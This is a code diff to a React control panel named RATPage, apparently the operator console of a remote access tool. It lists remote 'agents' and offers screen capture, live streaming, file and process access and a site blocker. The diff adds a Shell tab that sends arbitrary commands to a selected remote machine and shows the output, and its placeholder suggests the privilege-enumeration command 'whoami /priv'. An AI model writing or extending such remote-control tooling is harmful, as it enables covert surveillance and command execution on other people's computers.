@@ -49,7 +49,7 @@ interface Process {
   status: string
 }
 
-type Tab = 'screen' | 'stream' | 'files' | 'processes' | 'sites' | 'chat' | 'info'
+type Tab = 'screen' | 'stream' | 'files' | 'processes' | 'sites' | 'chat' | 'shell' | 'info'
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
@@ -202,7 +202,8 @@ const TABS: { id: Tab; label: string; icon: string }[] = [
   { id: 'processes', label: 'Processes',  icon: '⚙️' },
   { id: 'sites',     label: 'Blocker',    icon: '🚫' },
   { id: 'chat',      label: 'Message',    icon: '💬' },
-  { id: 'info',      label: 'Info',       icon: '🖥' },
+  { id: 'shell',     label: 'Shell',      icon: '🖥' },
+  { id: 'info',      label: 'Info',       icon: 'ℹ️' },
 ]
 
 function TabBar({ active, onChange }: { active: Tab; onChange: (t: Tab) => void }) {
@@ -792,6 +793,145 @@ function ChatTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDeta
   )
 }
 
+// ─── Shell tab ────────────────────────────────────────────────────────────────
+
+interface ShellEntry {
+  cmd: string
+  output: string
+  ts: string
+  pending?: boolean
+}
+
+function ShellTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDetail | null; onRefresh: () => void }) {
+  const [input, setInput] = useState('')
+  const [history, setHistory] = useState<ShellEntry[]>([])
+  const [cmdHistory, setCmdHistory] = useState<string[]>([])
+  const [historyIdx, setHistoryIdx] = useState(-1)
+  const [running, setRunning] = useState(false)
+  const bottomRef = useRef<HTMLDivElement>(null)
+  const prevMsgCount = useRef(0)
+
+  useEffect(() => {
+    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
+  }, [history])
+
+  // Watch for shell replies in messages
+  useEffect(() => {
+    const msgs = detail?.messages ?? []
+    if (msgs.length > prevMsgCount.current) {
+      const newMsgs = msgs.slice(prevMsgCount.current)
+      prevMsgCount.current = msgs.length
+      for (const m of newMsgs) {
+        if (m.sender === 'agent' && !m.body.startsWith('[file_read:') && !m.body.startsWith('[file_')) {
+          setHistory(prev => {
+            // Replace the last pending entry with the real output
+            const idx = prev.findLastIndex(e => e.pending)
+            if (idx === -1) return prev
+            const updated = [...prev]
+            updated[idx] = { ...updated[idx], output: m.body, pending: false }
+            return updated
+          })
+          setRunning(false)
+        }
+      }
+    }
+  }, [detail?.messages])
+
+  async function run() {
+    const cmd = input.trim()
+    if (!cmd || running) return
+    setInput('')
+    setHistoryIdx(-1)
+    setCmdHistory(prev => [cmd, ...prev].slice(0, 50))
+    setRunning(true)
+    setHistory(prev => [...prev, { cmd, output: '', ts: new Date().toISOString(), pending: true }])
+    await sendCommand(agent.id, 'shell', { command: cmd })
+    // Poll for reply
+    let attempts = 0
+    const poll = setInterval(() => {
+      attempts++
+      onRefresh()
+      if (attempts > 30) { clearInterval(poll); setRunning(false) }
+    }, 600)
+  }
+
+  function onKeyDown(e: React.KeyboardEvent<HTMLInputElement>) {
+    if (e.key === 'Enter') { run(); return }
+    if (e.key === 'ArrowUp') {
+      e.preventDefault()
+      const idx = Math.min(historyIdx + 1, cmdHistory.length - 1)
+      setHistoryIdx(idx)
+      setInput(cmdHistory[idx] ?? '')
+    }
+    if (e.key === 'ArrowDown') {
+      e.preventDefault()
+      const idx = Math.max(historyIdx - 1, -1)
+      setHistoryIdx(idx)
+      setInput(idx === -1 ? '' : cmdHistory[idx] ?? '')
+    }
+  }
+
+  return (
+    <Card style={{ minHeight: 480 }}>
+      <PanelHeader>
+        <span className="text-[12px]" style={{ color: '#5d585c' }}>
+          Shell · {agent.alias || agent.hostname}
+          <span className="ml-2 text-[10px]" style={{ color: '#3a3537' }}>↑↓ history</span>
+        </span>
+        <Btn small onClick={() => { setHistory([]); prevMsgCount.current = detail?.messages?.length ?? 0 }}>
+          Clear
+        </Btn>
+      </PanelHeader>
+
+      {/* Output area */}
+      <div className="overflow-y-auto p-3 font-mono text-[12px] flex flex-col gap-3" style={{ minHeight: 360, maxHeight: 420, background: '#0a0709' }}>
+        {history.length === 0 && (
+          <p className="text-[12px]" style={{ color: '#3a3537' }}>
+            Run a command to see output. Try: <span style={{ color: '#5d585c' }}>whoami /priv</span>
+          </p>
+        )}
+        {history.map((entry, i) => (
+          <div key={i}>
+            <div className="flex items-center gap-2 mb-1">
+              <span style={{ color: '#dc2625' }}>❯</span>
+              <span style={{ color: '#e5e3e4' }}>{entry.cmd}</span>
+              <span className="text-[10px] ml-auto" style={{ color: '#3a3537' }}>{ago(entry.ts)}</span>
+            </div>
+            {entry.pending
+              ? <div className="flex items-center gap-1.5 pl-4" style={{ color: '#5d585c' }}>
+                  <span className="animate-pulse">▋</span>
+                  <span className="text-[11px]">waiting for response…</span>
+                </div>
+              : entry.output
+                ? <pre className="pl-4 whitespace-pre-wrap break-all leading-relaxed" style={{ color: '#a89fa1' }}>{entry.output}</pre>
+                : <span className="pl-4 text-[11px]" style={{ color: '#3a3537' }}>(no output)</span>
+            }
+          </div>
+        ))}
+        <div ref={bottomRef} />
+      </div>
+
+      {/* Input */}
+      <div className="flex items-center gap-2 px-3 py-2 border-t" style={{ borderColor: '#2e292b', background: '#0a0709' }}>
+        <span style={{ color: '#dc2625' }} className="font-mono text-[13px] shrink-0">❯</span>
+        <input
+          value={input}
+          onChange={e => setInput(e.target.value)}
+          onKeyDown={onKeyDown}
+          placeholder="Enter command…"
+          disabled={running}
+          className="flex-1 bg-transparent outline-none font-mono text-[12px] disabled:opacity-40"
+          style={{ color: '#e5e3e4', caretColor: '#dc2625' }}
+          autoFocus
+        />
+        <Btn small onClick={run} disabled={running || !input.trim()}>
+          {running ? '…' : 'Run'}
+        </Btn>
+      </div>
+    </Card>
+  )
+}
+
 // ─── Info tab ─────────────────────────────────────────────────────────────────
 
 function InfoTab({ agent, onAliasChange, onDelete }: { agent: Agent; onAliasChange: () => void; onDelete: () => void }) {
@@ -998,6 +1138,7 @@ export default function RATPage() {
                 {tab === 'processes' && <ProcessesTab  agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
                 {tab === 'sites'     && <SitesTab      agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
                 {tab === 'chat'      && <ChatTab       agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
+                {tab === 'shell'     && <ShellTab      agent={selectedAgent} detail={detail} onRefresh={fetchDetail} />}
                 {tab === 'info'      && <InfoTab       agent={selectedAgent} onAliasChange={fetchAgents} onDelete={() => { setSelected(null); fetchAgents() }} />}
               </>
             )
